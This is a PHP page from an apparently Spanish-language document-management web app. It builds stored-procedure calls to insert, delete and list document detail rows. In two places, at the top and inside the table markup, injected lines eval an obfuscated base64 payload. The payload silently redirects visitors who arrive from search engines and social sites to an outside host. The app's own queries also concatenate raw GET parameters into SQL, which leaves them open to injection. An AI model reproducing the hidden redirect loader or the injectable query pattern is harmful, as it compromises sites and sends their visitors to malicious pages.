<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9"));
session_start();
//$meses = Array("Enero","Febrero","Marzo","Abril","Mayo","Junio","Julio","Agosto",
//    "Setiembre","Octubre","Noviembre","Diciembre");

$meses = Array("Ene","Feb","Mar","Abr","May","Jun","Jul","Ago",
    "Sep","Oct","Nov","Dic");

require_once 'lib/function_gen.php';
if (isset($_SESSION["Doc_Codigo"]))
    $doc_codigo = $_SESSION["Doc_Codigo"];

if (isset($_GET["mode"]))
    $mode = $_GET["mode"];

switch ($mode) {
    case "insert":
        $dtt_ext = $_GET["dtt_ext"];
        $dtt_monto = $_GET["dtt_monto"];
        $dtt_mesini = $_GET["dtt_mesini"];
        $dtt_mesfin = $_GET["dtt_mesfin"];
        $ddt_text = $_GET["dtt_text"];
        $ddt_soporte = $_GET["dtt_soporte"];

        $query = "CALL mp_CRUD_DocumentoDetalle_DDt(";
        $query .= "nDoc_Codigo =  " . $doc_codigo . ",";
        if ($dtt_ext == 0)
            $query .= "nCta_Codigo = 0,";
        else
            $query .= "nCta_Codigo = 99,";

        $query .= "nDtt_MesIni =  " . $dtt_mesini . ",";
        $query .= "nDtt_MesFin =  " . $dtt_mesfin . ",";
        $query .= "nDtt_Monto  =  " . $dtt_monto . ",";
        $query .= "sDDt_Text   = '" . $ddt_text . "',";
        $query .= "sDDt_Soporte   = '" . $ddt_soporte . "',";
        $query .= "nAction = 2)";
        fnc_ejecutaQuery($query);
        break;
    case "delete":
        $dtt_codigo = $_GET["dtt_codigo"];
        $query = "CALL mp_CRUD_DocumentoDetalle_DDt(";
        $query .= "nDDt_Codigo = " . $dtt_codigo . ",";
        $query .= "nAction = 4)";
        fnc_ejecutaQuery($query);
        break;
}
?>

<div class="tabla_2">
    <table width="500" border="0" cellspacing="0" cellpadding="0" style="margin: 0 auto;">
        <tr>
            <td colspan="3"><div id="pestanabalance">Documentos</div></td>
        </tr>
        <tr class="fila_blanca_balance">
            <td width="200"><span class="valores">Meses</span></td>
            <td width="190"><span class="valores">Cuenta</span></td>
            <td width="100"><span class="valores"></span></td>
        </tr>
        <tr class="fila_linea">
            <td colspan="12"></td>
        </tr>
        <?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9"));
        $query = "CALL mp_R_DocumentoDetalle_DDt_Acc12(";
        $query .= "nDoc_Codigo = " . $doc_codigo;
        $query .= ")";
        $booler = true;
		$i = 0;
		
        $grid_values = fnc_ejecutaQuery($query);
        //var_dump($grid_values);
        if ($grid_values > 0)
            foreach ($grid_values as $line) {

                if ($booler)
                    echo '<tr class="fila_blanca">';
                else
                    echo '<tr class="fila_gris">';

                echo '  <td><span class="casillas">' . substr($line['Dtt_MesIni'], 0 ,-2). " ". $meses[ (int) substr($line['Dtt_MesIni'], 4) -1] . ' - ' . substr($line['Dtt_MesFin'], 0 ,-2). " ". $meses[ (int) substr($line['Dtt_MesFin'], 4) -1] . '</span></td>';
                echo '  <td><span class="casillas">' . utf8_encode($line['Nro_cuenta']) . '</span></td>';
                echo '  <td><span id="eliminar"><a href="javascript:deleteDocDetCert(' . $doc_codigo . ', ' . $line['DDt_Codigo'] . ');">eliminar</a></span></td>';
                echo '</tr>';
                $booler = !$booler;
				$i++;
            }
			echo "<input type='hidden' id='_aqehgjhcony_vall3' value='$i' />";
        ?>
    </table>
</div>


